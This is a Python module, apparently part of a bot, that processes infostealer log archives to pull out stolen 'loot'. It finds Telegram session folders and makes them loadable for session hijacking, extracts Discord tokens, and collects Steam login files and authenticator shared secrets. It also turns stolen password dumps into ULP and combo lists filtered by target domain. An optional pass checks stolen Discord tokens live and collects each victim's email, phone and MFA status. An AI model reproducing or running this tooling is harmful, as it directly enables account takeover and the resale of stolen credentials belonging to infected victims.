"""
Loot scanning: detect Telegram ``tdata`` sessions, Discord tokens,
Steam accounts and saved-password entries (ULP + combos) inside a
directory tree extracted from an infostealer log archive.

The scanners are deliberately strict so that the output is high signal
("no trash"): tokens must match the exact format the issuing service
uses, vdf files are parsed properly, and tdata folders are validated
against the Telegram Desktop binary layout (``TDF$`` magic + the
``[A-F0-9]{16}`` keyfile + matching subfolder).

Live validation (Discord ``/users/@me``, Steam community xml) is opt-in
via :func:`validate_loot_async`; the scanners themselves are pure
filesystem walks and never touch the network.
"""

from __future__ import annotations

import asyncio
import json
import os
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, Iterable, List, Optional, Tuple

from loguru import logger

# ─── File-size / scan limits ────────────────────────────────────────

# Hard cap per file we'll read into memory while scanning. Larger files
# are streamed in 1 MB chunks (cheap) or skipped (e.g. ldb >256 MB).
MAX_SCAN_BYTES = 64 * 1024 * 1024
LDB_CHUNK_BYTES = 1024 * 1024
LDB_MAX_BYTES = 256 * 1024 * 1024

# ─── Token + credential regex ───────────────────────────────────────

# Discord auth tokens have two formats. The classic three-segment JWT
# (M*/N*/O* prefix) and the newer ``mfa.<long>`` token.
_DISCORD_TOKEN_RE = re.compile(
    rb"(?:[MNO][A-Za-z0-9_\-]{23,25}\.[A-Za-z0-9_\-]{6,7}\.[A-Za-z0-9_\-]{27,42}"
    rb"|mfa\.[A-Za-z0-9_\-]{84,})"
)

# Bytes that often surround a real token inside LevelDB blobs — used to
# strip leading "token: " or trailing quote / null junk after a match.
_DISCORD_STRIP_RE = re.compile(r"[\"',\s\x00-\x1f]")

# Standard stealer password block headers (Vidar, Redline, Raccoon,
# Lumma, Stealc, Mars, Meta etc.). We try a few synonyms per field.
_PWD_URL_KEYS = ("url", "host", "hostname", "soft", "softs", "site")
_PWD_USER_KEYS = ("login", "user", "username", "user name", "email")
_PWD_PASS_KEYS = ("password", "passwords", "pass", "pwd")

_PWD_FIELD_RE = re.compile(
    r"^\s*([A-Za-z][A-Za-z _]+?)\s*[:=]\s*(.*?)\s*$"
)

# Stealer dumps name their saved-password files several different
# ways. We treat anything matching this as a candidate.
_PWD_FILENAMES = re.compile(
    r"^(all[_\- ]?)?passwords?(\s*\(\d+\))?\.txt$"
    r"|^saved[_\- ]?passwords?\.txt$"
    r"|^pwd\.txt$",
    re.IGNORECASE,
)

# ─── tdata layout ───────────────────────────────────────────────────

# Telegram Desktop drops session files inside a ``tdata`` directory.
# The main "key file" sits at the root of tdata and is named after a
# 16-hex-char prefix (default ``D877F783D5D3EF8C`` for the implicit
# local key when no local password is set). The same prefix is also
# used as the name of the subfolder holding the encrypted user state.
_TDATA_KEYFILE_RE = re.compile(r"^[A-Fa-f0-9]{16}s?$")
_TDATA_KEYFOLDER_RE = re.compile(r"^[A-Fa-f0-9]{16}$")
_TDATA_MAGIC = b"TDF$"

# ─── Steam ──────────────────────────────────────────────────────────

# Steam stores known logins in ``config/loginusers.vdf`` (text VDF).
# Sentry files (``ssfn*``) carry the machine-auth blob. Mobile
# Authenticator dumps are JSON ``.maFile`` files.
_SSFN_RE = re.compile(r"^ssfn[A-Za-z0-9]+$", re.IGNORECASE)
_LOGINUSERS_RE = re.compile(r"loginusers\.vdf$", re.IGNORECASE)


# ════════════════════════════════════════════════════════════════════
#  Dataclasses — public result types
# ════════════════════════════════════════════════════════════════════


@dataclass
class TdataAccount:
    """A Telegram Desktop session folder found inside the logs."""

    root: str
    """Absolute path of the ``tdata`` (or ``tdata/Telegram``) folder."""

    keyfile: str = ""
    """Filename of the 16-hex keyfile (without the trailing ``s``)."""

    key_datas_size: int = 0
    has_maps: bool = False
    has_tdf_magic: bool = False
    info_path: str = ""
    info: Dict[str, str] = field(default_factory=dict)
    valid: bool = False
    reason: str = ""


@dataclass
class DiscordToken:
    """A Discord authentication token recovered from disk."""

    token: str
    source_file: str
    redacted: str = ""
    valid: Optional[bool] = None
    user_id: str = ""
    username: str = ""
    global_name: str = ""
    email: str = ""
    phone: str = ""
    mfa_enabled: Optional[bool] = None
    verified: Optional[bool] = None
    locale: str = ""
    nitro: str = ""
    error: str = ""

    def __post_init__(self) -> None:
        if not self.redacted:
            self.redacted = _redact_token(self.token)


@dataclass
class SteamAccount:
    """A Steam account (with optional sentry / authenticator material)."""

    source_file: str
    steam_id: str = ""
    account_name: str = ""
    persona_name: str = ""
    remember_password: Optional[bool] = None
    most_recent: Optional[bool] = None
    timestamp: int = 0
    ssfn_files: List[str] = field(default_factory=list)
    mafile_path: str = ""
    mafile_shared_secret: str = ""
    valid: Optional[bool] = None
    profile_url: str = ""
    error: str = ""


@dataclass
class CredentialEntry:
    """A single ``URL : USER : PASS`` block from a stealer password dump."""

    url: str
    username: str
    password: str
    source_file: str
    domain: str = ""
    soft: str = ""


@dataclass
class LootResult:
    """Aggregated output of a full log-archive scan."""

    tdata: List[TdataAccount] = field(default_factory=list)
    discord: List[DiscordToken] = field(default_factory=list)
    steam: List[SteamAccount] = field(default_factory=list)
    credentials: List[CredentialEntry] = field(default_factory=list)
    scanned_files: int = 0
    errors: List[str] = field(default_factory=list)


# ════════════════════════════════════════════════════════════════════
#  Helpers
# ════════════════════════════════════════════════════════════════════


def _redact_token(token: str) -> str:
    if len(token) <= 14:
        return token[:4] + "***"
    return f"{token[:6]}...{token[-4:]}"


def _domain_from_url(url: str) -> str:
    """Best-effort host extraction. Returns the eTLD+1 in lowercase, or
    just the raw netloc when we cannot parse out a public suffix."""
    if not url:
        return ""
    raw = url.strip()
    if "://" not in raw:
        raw = "http://" + raw
    try:
        netloc = urllib.parse.urlparse(raw).netloc.lower()
    except ValueError:
        return ""
    netloc = netloc.split("@")[-1]
    netloc = netloc.split(":")[0]
    if not netloc:
        return ""
    parts = netloc.split(".")
    if len(parts) <= 2:
        return netloc
    # crude eTLD+1: keep last two components unless the second-last is
    # itself a TLD-shaped suffix (co.uk, com.br, ...). The list is
    # short on purpose — for output filenames we don't need IANA-level
    # accuracy, only consistent grouping.
    second_level = {
        "co.uk", "co.in", "co.jp", "co.kr", "com.br", "com.au",
        "com.mx", "com.ar", "com.tr", "com.cn", "com.tw", "com.sa",
        "org.uk", "ac.uk", "gov.uk", "net.au",
    }
    tail2 = ".".join(parts[-2:])
    if tail2 in second_level and len(parts) >= 3:
        return ".".join(parts[-3:])
    return tail2


def _read_text(path: str, *, max_bytes: int = MAX_SCAN_BYTES) -> str:
    """Read a small text file, capped at *max_bytes*. Returns empty
    string on any error so the caller can continue scanning."""
    try:
        with open(path, "rb") as fh:
            data = fh.read(max_bytes)
    except OSError:
        return ""
    return data.decode("utf-8", errors="ignore")


def _walk_files(root: str) -> Iterable[Tuple[str, str]]:
    """Yield ``(dirpath, filename)`` for every file under *root*."""
    for dirpath, _dirs, files in os.walk(root):
        for name in files:
            yield dirpath, name


# ════════════════════════════════════════════════════════════════════
#  tdata scanner
# ════════════════════════════════════════════════════════════════════


def _looks_like_tdata(path: str) -> Optional[TdataAccount]:
    """If *path* (a directory) looks like a Telegram Desktop ``tdata``
    folder return a partially-populated :class:`TdataAccount`."""
    try:
        entries = os.listdir(path)
    except OSError:
        return None
    has_key_datas = "key_datas" in entries
    keyfile = ""
    keyfolder = ""
    for name in entries:
        if _TDATA_KEYFILE_RE.match(name) and os.path.isfile(
            os.path.join(path, name)
        ):
            # Prefer the no-suffix variant; ``foo`` over ``foos``.
            if not name.endswith("s") or not keyfile:
                keyfile = name.rstrip("s")
        if _TDATA_KEYFOLDER_RE.match(name) and os.path.isdir(
            os.path.join(path, name)
        ):
            keyfolder = name
    if not (has_key_datas or keyfile):
        return None
    acc = TdataAccount(root=path, keyfile=keyfile)
    if has_key_datas:
        key_path = os.path.join(path, "key_datas")
        try:
            with open(key_path, "rb") as fh:
                head = fh.read(4)
            acc.key_datas_size = os.path.getsize(key_path)
            acc.has_tdf_magic = head == _TDATA_MAGIC
        except OSError:
            pass
    if keyfolder:
        maps_path = os.path.join(path, keyfolder, "maps")
        acc.has_maps = os.path.isfile(maps_path)
    return acc


def _populate_account_info(acc: TdataAccount, root: str) -> None:
    """Look for a sibling ``account_info.txt`` (Vidar/Lumma drop a
    pre-extracted summary) and parse it into ``acc.info``."""
    candidates: List[str] = []
    parent = os.path.dirname(acc.root.rstrip(os.sep))
    grand = os.path.dirname(parent)
    for base in (acc.root, parent, grand):
        if not base:
            continue
        for name in ("account_info.txt", "Telegram.txt",
                     "session_info.txt", "info.txt"):
            cand = os.path.join(base, name)
            if os.path.isfile(cand) and cand not in candidates:
                candidates.append(cand)
        # Also scan the whole containing log folder for any txt that
        # mentions tdata-typical headers.
    if not candidates:
        # Fall back: scan the immediate parent folder for any ``*.txt``
        # containing a "Phone" header — common in Vidar/Cryptbot dumps.
        for base in (parent, grand):
            if not base or not os.path.isdir(base):
                continue
            try:
                for entry in os.scandir(base):
                    if (
                        entry.is_file()
                        and entry.name.lower().endswith(".txt")
                        and entry.stat().st_size < 32 * 1024
                    ):
                        head = _read_text(entry.path, max_bytes=4096)
                        if "Phone" in head and ("User ID" in head
                                                or "UserID" in head):
                            candidates.append(entry.path)
                            break
            except OSError:
                continue
            if candidates:
                break

    if not candidates:
        return
    text = _read_text(candidates[0], max_bytes=64 * 1024)
    if not text:
        return
    acc.info_path = candidates[0]
    for raw_line in text.splitlines():
        m = _PWD_FIELD_RE.match(raw_line)
        if not m:
            continue
        key = m.group(1).strip().lower()
        val = m.group(2).strip()
        if not val or val == "—" or val == "-":
            continue
        # Normalise the keys we care about.
        key_norm = re.sub(r"\s+", "_", key)
        # Skip header-decoration matches like "=== ACCOUNT INFO ===".
        if key_norm.startswith("==="):
            continue
        acc.info[key_norm] = val


def scan_tdata(root: str) -> List[TdataAccount]:
    """Walk *root* and return every ``tdata`` folder found.

    Detection accepts the two layouts seen in the wild:

    * ``.../tdata/Telegram/`` containing the keyfile + ``key_datas``
      (current Telegram Desktop), and
    * ``.../tdata/`` directly containing the same files (older /
      stealer-rehosted dumps).
    """
    found: List[TdataAccount] = []
    seen_roots: set[str] = set()

    for dirpath, _dirs, _files in os.walk(root):
        name = os.path.basename(dirpath).lower()
        if name not in ("tdata", "telegram"):
            continue
        candidate = _looks_like_tdata(dirpath)
        if candidate and candidate.root not in seen_roots:
            seen_roots.add(candidate.root)
            _populate_account_info(candidate, root)
            candidate.valid, candidate.reason = _validate_tdata(candidate)
            found.append(candidate)
    return found


def _validate_tdata(acc: TdataAccount) -> Tuple[bool, str]:
    """Structural validation. We don't connect to MTProto here — that
    would require a heavyweight Telegram client per session. Instead
    we verify the layout matches Telegram Desktop's on-disk format so
    the bundle we send back is at least *loadable* by tdesktop /
    opentele."""
    if acc.key_datas_size == 0:
        return False, "key_datas missing"
    if not acc.has_tdf_magic:
        return False, "key_datas header is not TDF$"
    if not acc.keyfile:
        return False, "16-hex keyfile not found"
    if not acc.has_maps:
        return False, "session data folder missing maps file"
    return True, ""


# ════════════════════════════════════════════════════════════════════
#  Discord token scanner
# ════════════════════════════════════════════════════════════════════


# Filenames where stealers commonly drop already-extracted tokens. We
# also scan all files inside the Discord roaming folder.
_DISCORD_PLAINTEXT_FILES = re.compile(
    r"^(discord|tokens?|discord_tokens?)\.txt$", re.IGNORECASE,
)
_DISCORD_LDB_RE = re.compile(r"\.(ldb|log|leveldb)$", re.IGNORECASE)
_DISCORD_PATH_HINT = re.compile(
    r"(discord|discordcanary|discordptb)[/\\]",
    re.IGNORECASE,
)


def _extract_tokens_from_bytes(blob: bytes) -> List[str]:
    """Return every Discord token literal contained in *blob*."""
    tokens: List[str] = []
    for m in _DISCORD_TOKEN_RE.finditer(blob):
        try:
            tok = m.group(0).decode("ascii", errors="ignore")
        except UnicodeDecodeError:
            continue
        tok = _DISCORD_STRIP_RE.sub("", tok)
        if tok:
            tokens.append(tok)
    return tokens


def _extract_tokens_from_file(path: str) -> List[str]:
    try:
        size = os.path.getsize(path)
    except OSError:
        return []
    if size == 0 or size > LDB_MAX_BYTES:
        return []
    tokens: List[str] = []
    try:
        if size <= LDB_CHUNK_BYTES:
            with open(path, "rb") as fh:
                tokens.extend(_extract_tokens_from_bytes(fh.read()))
        else:
            # Stream in overlapping chunks so a token straddling a
            # chunk boundary still matches.
            overlap = 256
            with open(path, "rb") as fh:
                tail = b""
                while True:
                    chunk = fh.read(LDB_CHUNK_BYTES)
                    if not chunk:
                        break
                    tokens.extend(
                        _extract_tokens_from_bytes(tail + chunk)
                    )
                    tail = chunk[-overlap:]
    except OSError:
        return []
    return tokens


def scan_discord_tokens(root: str) -> List[DiscordToken]:
    """Walk *root* and return every Discord token literal we can find.

    Plaintext stealer dumps (``tokens.txt``, ``discord.txt``) are
    parsed line-wise. Real LevelDB / log files from a Discord roaming
    folder are scanned in chunks. Duplicates are collapsed so the
    output is deduplicated by token string.
    """
    seen: Dict[str, DiscordToken] = {}
    for dirpath, name in _walk_files(root):
        path = os.path.join(dirpath, name)
        rel = os.path.relpath(path, root)
        if _DISCORD_PLAINTEXT_FILES.match(name):
            text = _read_text(path, max_bytes=8 * 1024 * 1024)
            for line in text.splitlines():
                # Plain-text dumps usually carry one token per line.
                token = line.strip().strip('"').strip("'")
                token = token.split()[0] if token.split() else ""
                if token and _DISCORD_TOKEN_RE.match(token.encode()):
                    if token not in seen:
                        seen[token] = DiscordToken(
                            token=token, source_file=rel,
                        )
        elif _DISCORD_LDB_RE.search(name) or _DISCORD_PATH_HINT.search(rel):
            for tok in _extract_tokens_from_file(path):
                if tok not in seen:
                    seen[tok] = DiscordToken(token=tok, source_file=rel)
    return list(seen.values())


# ════════════════════════════════════════════════════════════════════
#  Steam scanner
# ════════════════════════════════════════════════════════════════════


def _parse_vdf(text: str) -> Dict:
    """Very small Valve KeyValues parser. Handles nested blocks and
    quoted strings. Returns a nested dict; values are strings.

    We deliberately avoid pulling in the third-party ``vdf`` package
    so the bot has zero extra runtime deps for this feature.
    """
    pos = 0
    n = len(text)

    def skip_ws() -> None:
        nonlocal pos
        while pos < n:
            ch = text[pos]
            if ch in " \t\r\n":
                pos += 1
            elif ch == "/" and pos + 1 < n and text[pos + 1] == "/":
                while pos < n and text[pos] != "\n":
                    pos += 1
            else:
                break

    def read_token() -> str:
        nonlocal pos
        skip_ws()
        if pos >= n:
            return ""
        if text[pos] == '"':
            pos += 1
            start = pos
            while pos < n and text[pos] != '"':
                if text[pos] == "\\" and pos + 1 < n:
                    pos += 2
                else:
                    pos += 1
            tok = text[start:pos]
            if pos < n:
                pos += 1
            return tok
        if text[pos] in "{}":
            ch = text[pos]
            pos += 1
            return ch
        start = pos
        while pos < n and text[pos] not in ' \t\r\n"{}':
            pos += 1
        return text[start:pos]

    def parse_block() -> Dict:
        block: Dict = {}
        while True:
            key = read_token()
            if key == "" or key == "}":
                return block
            skip_ws()
            if pos < n and text[pos] == "{":
                pos_save = pos + 1
                pos_local = pos
                # advance past the '{'
                _ = read_token()
                block[key] = parse_block()
                # consume the matching '}'
                _ = pos_save  # noqa: B018 (silence linter)
                _ = pos_local
            else:
                val = read_token()
                block[key] = val

    return parse_block()


def _parse_loginusers(path: str) -> List[SteamAccount]:
    """Parse ``loginusers.vdf`` and return one :class:`SteamAccount`
    per recorded user."""
    raw = _read_text(path, max_bytes=2 * 1024 * 1024)
    if not raw:
        return []
    try:
        tree = _parse_vdf(raw)
    except Exception:
        logger.exception("Failed to parse loginusers vdf {}", path)
        return []
    users_node = tree.get("users") or {}
    if not isinstance(users_node, dict):
        return []
    accounts: List[SteamAccount] = []
    for steam_id, attrs in users_node.items():
        if not isinstance(attrs, dict):
            continue
        acc = SteamAccount(
            source_file=path,
            steam_id=steam_id,
            account_name=attrs.get("AccountName", ""),
            persona_name=attrs.get("PersonaName", ""),
            profile_url=(
                f"https://steamcommunity.com/profiles/{steam_id}"
                if steam_id.isdigit() else ""
            ),
        )
        rp = attrs.get("RememberPassword", "")
        mr = attrs.get("MostRecent", "")
        ts = attrs.get("Timestamp", "")
        if rp in ("0", "1"):
            acc.remember_password = rp == "1"
        if mr in ("0", "1"):
            acc.most_recent = mr == "1"
        if ts.isdigit():
            acc.timestamp = int(ts)
        accounts.append(acc)
    return accounts


def _parse_mafile(path: str) -> Optional[SteamAccount]:
    """``.maFile`` is JSON; pull SteamID + the shared_secret so the
    operator can re-link the authenticator. We never log the actual
    secret value."""
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            data = json.load(fh)
    except (OSError, json.JSONDecodeError):
        return None
    if not isinstance(data, dict):
        return None
    steam_id = str(data.get("Session", {}).get("SteamID", "") or
                   data.get("steamid", "") or "")
    acc_name = data.get("account_name", "") or ""
    secret = data.get("shared_secret", "") or ""
    if not (steam_id or acc_name or secret):
        return None
    return SteamAccount(
        source_file=path,
        steam_id=steam_id,
        account_name=acc_name,
        mafile_path=path,
        mafile_shared_secret=secret,
        profile_url=(
            f"https://steamcommunity.com/profiles/{steam_id}"
            if steam_id.isdigit() else ""
        ),
    )


def scan_steam(root: str) -> List[SteamAccount]:
    """Find ``loginusers.vdf`` + sentry files + ``.maFile`` entries.

    Sentry files (``ssfn*``) are attached to whichever account shares
    their containing folder; this matches how Steam stores them on
    disk."""
    accounts: List[SteamAccount] = []
    ssfn_by_dir: Dict[str, List[str]] = {}
    mafiles: List[str] = []

    for dirpath, name in _walk_files(root):
        path = os.path.join(dirpath, name)
        rel = os.path.relpath(path, root)
        if _LOGINUSERS_RE.search(name):
            accounts.extend(_parse_loginusers(path))
            # rewrite source_file to be relative for cleaner reporting
            for acc in accounts:
                if acc.source_file == path:
                    acc.source_file = rel
        elif _SSFN_RE.match(name):
            ssfn_by_dir.setdefault(dirpath, []).append(rel)
        elif name.lower().endswith(".mafile"):
            mafiles.append(path)

    for ma in mafiles:
        acc = _parse_mafile(ma)
        if acc:
            acc.source_file = os.path.relpath(ma, root)
            accounts.append(acc)

    # Attach any sentry files we found to accounts that live in the
    # same directory tree.
    for acc in accounts:
        acc_dir = os.path.dirname(os.path.join(root, acc.source_file))
        for d, files in ssfn_by_dir.items():
            if d == acc_dir or d.startswith(acc_dir + os.sep):
                acc.ssfn_files.extend(files)
        acc.ssfn_files = sorted(set(acc.ssfn_files))

    return accounts


# ════════════════════════════════════════════════════════════════════
#  Password file scanner (ULP + combos)
# ════════════════════════════════════════════════════════════════════


def _parse_password_dump(text: str, source: str) -> List[CredentialEntry]:
    """Parse a stealer-style ``Passwords.txt`` block format.

    Blocks look like::

        URL: https://example.com/login
        Username: alice
        Password: hunter2

    with variants for ``Host`` / ``Soft`` / ``Login`` headers. Blocks
    are separated by blank lines, ``=`` rules, or the start of the
    next ``URL:`` header.
    """
    entries: List[CredentialEntry] = []
    cur: Dict[str, str] = {}

    def flush() -> None:
        url = cur.get("url", "")
        user = cur.get("user", "")
        pwd = cur.get("pass", "")
        if (url or user) and pwd:
            entries.append(
                CredentialEntry(
                    url=url,
                    username=user,
                    password=pwd,
                    source_file=source,
                    domain=_domain_from_url(url) or _domain_from_url(
                        cur.get("soft", "")
                    ),
                    soft=cur.get("soft", ""),
                )
            )
        cur.clear()

    for raw_line in text.splitlines():
        line = raw_line.rstrip()
        if not line.strip():
            # blank line ends the block
            if cur:
                flush()
            continue
        if set(line.strip()) <= set("=-_*\t "):
            if cur:
                flush()
            continue
        m = _PWD_FIELD_RE.match(line)
        if not m:
            continue
        key = m.group(1).strip().lower()
        val = m.group(2).strip()
        if not val:
            continue
        if key in _PWD_URL_KEYS:
            if "url" in cur:
                flush()
            cur["url"] = val
            if key == "soft":
                cur["soft"] = val
        elif key in _PWD_USER_KEYS:
            cur["user"] = val
        elif key in _PWD_PASS_KEYS:
            cur["pass"] = val
            # password is always the last field in a block — flush.
            flush()
    if cur:
        flush()
    return entries


def scan_passwords(root: str) -> List[CredentialEntry]:
    """Find every recognised saved-password file in *root* and return
    a flat list of credential entries."""
    out: List[CredentialEntry] = []
    for dirpath, name in _walk_files(root):
        if not _PWD_FILENAMES.match(name):
            continue
        path = os.path.join(dirpath, name)
        rel = os.path.relpath(path, root)
        text = _read_text(path, max_bytes=32 * 1024 * 1024)
        if not text:
            continue
        out.extend(_parse_password_dump(text, rel))
    return out


# ════════════════════════════════════════════════════════════════════
#  Public orchestration entry
# ════════════════════════════════════════════════════════════════════


def scan_directory_for_loot(
    root: str,
    buckets: "frozenset[str] | None" = None,
) -> LootResult:
    """Run every (or selected) loot scanner over *root* and return the
    aggregated result.

    *buckets* is an optional frozenset of bucket identifiers (e.g.
    ``{"loot_tdata", "loot_discord"}``).  When ``None`` or empty **all**
    scanners run.  Pass specific bucket constants from
    ``services.loot_extractor`` to limit the scan.
    """
    run_all = not buckets
    result = LootResult()
    if run_all or "loot_tdata" in buckets:
        try:
            result.tdata = scan_tdata(root)
        except Exception as exc:
            logger.exception("scan_tdata failed")
            result.errors.append(f"tdata scan failed: {exc}")
    if run_all or "loot_discord" in buckets:
        try:
            result.discord = scan_discord_tokens(root)
        except Exception as exc:
            logger.exception("scan_discord_tokens failed")
            result.errors.append(f"discord scan failed: {exc}")
    if run_all or "loot_steam" in buckets:
        try:
            result.steam = scan_steam(root)
        except Exception as exc:
            logger.exception("scan_steam failed")
            result.errors.append(f"steam scan failed: {exc}")
    if run_all or "loot_passwords" in buckets:
        try:
            result.credentials = scan_passwords(root)
        except Exception as exc:
            logger.exception("scan_passwords failed")
            result.errors.append(f"password scan failed: {exc}")
    return result


# ════════════════════════════════════════════════════════════════════
#  Validation (network) — opt-in, async, best-effort
# ════════════════════════════════════════════════════════════════════


async def _validate_discord_token(session, token: DiscordToken) -> None:
    """Hit Discord's ``/users/@me`` with the recovered token. Updates
    *token* in place with the live user fields."""
    try:
        async with session.get(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token.token},
            timeout=10,
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                token.valid = True
                token.user_id = str(data.get("id", "") or "")
                token.username = data.get("username", "") or ""
                token.global_name = data.get("global_name", "") or ""
                token.email = data.get("email", "") or ""
                token.phone = data.get("phone", "") or ""
                token.mfa_enabled = bool(data.get("mfa_enabled", False))
                token.verified = bool(data.get("verified", False))
                token.locale = data.get("locale", "") or ""
                # premium_type: 0=none, 1=classic, 2=full, 3=basic
                pt = data.get("premium_type")
                token.nitro = {
                    0: "none", 1: "classic", 2: "nitro", 3: "basic",
                }.get(pt, "")
                return
            if resp.status == 401:
                token.valid = False
                token.error = "401 unauthorised"
                return
            token.valid = False
            token.error = f"HTTP {resp.status}"
    except asyncio.TimeoutError:
        token.error = "timeout"
    except Exception as exc:
        token.error = str(exc)


async def _validate_steam_account(session, acc: SteamAccount) -> None:
    """Cheap public-profile probe. We don't have credentials to test
    the saved login itself, so we just confirm the SteamID resolves to
    a real profile."""
    if not acc.steam_id or not acc.steam_id.isdigit():
        return
    url = f"https://steamcommunity.com/profiles/{acc.steam_id}?xml=1"
    try:
        async with session.get(url, timeout=10) as resp:
            if resp.status != 200:
                acc.error = f"HTTP {resp.status}"
                return
            text = await resp.text()
            # Steam returns an XML doc with <steamID> for real users.
            if "<steamID>" in text:
                acc.valid = True
            else:
                acc.valid = False
                acc.error = "profile not found"
    except asyncio.TimeoutError:
        acc.error = "timeout"
    except Exception as exc:
        acc.error = str(exc)


async def validate_loot_async(
    loot: LootResult,
    *,
    validate_discord: bool = True,
    validate_steam: bool = True,
    concurrency: int = 8,
) -> None:
    """Run the optional network-validation pass.

    Discord tokens and Steam accounts are hit in parallel with a small
    concurrency budget to stay polite. tdata sessions are not
    network-validated here (that requires a Telegram client per
    session; structure validation has already been done).
    """
    # Import aiohttp lazily so a user running the scanners offline
    # never pays the import cost.
    try:
        import aiohttp
    except ImportError:
        logger.warning("aiohttp missing — skipping loot validation")
        return

    timeout = aiohttp.ClientTimeout(total=15)
    sem = asyncio.Semaphore(max(1, concurrency))

    async def _run(coro):
        async with sem:
            await coro

    async with aiohttp.ClientSession(
        timeout=timeout,
        headers={
            "User-Agent": "Mozilla/5.0 (compatible; SaitmaLoot/1.0)",
        },
    ) as session:
        tasks = []
        if validate_discord:
            tasks.extend(
                _run(_validate_discord_token(session, tk))
                for tk in loot.discord
            )
        if validate_steam:
            tasks.extend(
                _run(_validate_steam_account(session, acc))
                for acc in loot.steam
            )
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)


# ════════════════════════════════════════════════════════════════════
#  ULP / Combo output builders
# ════════════════════════════════════════════════════════════════════


def build_ulp_text(entries: Iterable[CredentialEntry]) -> str:
    """Render ``URL:USER:PASS`` per line."""
    lines: List[str] = []
    for e in entries:
        if not (e.username and e.password):
            continue
        url = e.url or e.soft or e.domain or "unknown"
        # Replace ``:`` inside the url with %3A so the trailing
        # ``:user:pass`` split is unambiguous.
        url_safe = url.replace("\n", " ").replace("\r", " ")
        user_safe = e.username.replace("\n", " ")
        pwd_safe = e.password.replace("\n", " ")
        lines.append(f"{url_safe}:{user_safe}:{pwd_safe}")
    return "\n".join(lines) + ("\n" if lines else "")


def build_combo_text(entries: Iterable[CredentialEntry]) -> str:
    """Render ``USER:PASS`` per line (no URL)."""
    lines: List[str] = []
    seen: set[Tuple[str, str]] = set()
    for e in entries:
        if not (e.username and e.password):
            continue
        key = (e.username, e.password)
        if key in seen:
            continue
        seen.add(key)
        lines.append(f"{e.username}:{e.password}")
    return "\n".join(lines) + ("\n" if lines else "")


def build_structured_combo_text(
    entries: Iterable[CredentialEntry],
) -> str:
    """Render combos grouped by domain header::

        === claude.ai ===
        user1:pass1
        user2:pass2

        === spotify.com ===
        user3:pass3
    """
    by_domain: Dict[str, List[CredentialEntry]] = {}
    for e in entries:
        if not (e.username and e.password):
            continue
        key = e.domain or "unknown"
        by_domain.setdefault(key, []).append(e)

    chunks: List[str] = []
    for domain in sorted(by_domain.keys()):
        chunks.append(f"=== {domain} ===")
        seen: set[Tuple[str, str]] = set()
        for e in by_domain[domain]:
            t = (e.username, e.password)
            if t in seen:
                continue
            seen.add(t)
            chunks.append(f"{e.username}:{e.password}")
        chunks.append("")
    return "\n".join(chunks).rstrip() + "\n" if chunks else ""


def filter_credentials(
    entries: Iterable[CredentialEntry],
    target_domains: Iterable[str],
) -> List[CredentialEntry]:
    """Return only entries whose ``domain`` matches one of *target_domains*
    (substring match, case-insensitive)."""
    needles = [d.strip().lower().lstrip(".") for d in target_domains
               if d and d.strip()]
    if not needles:
        return list(entries)
    out: List[CredentialEntry] = []
    for e in entries:
        haystack = (
            e.domain or _domain_from_url(e.url) or e.soft or e.url
        ).lower()
        if any(n in haystack for n in needles):
            out.append(e)
    return out
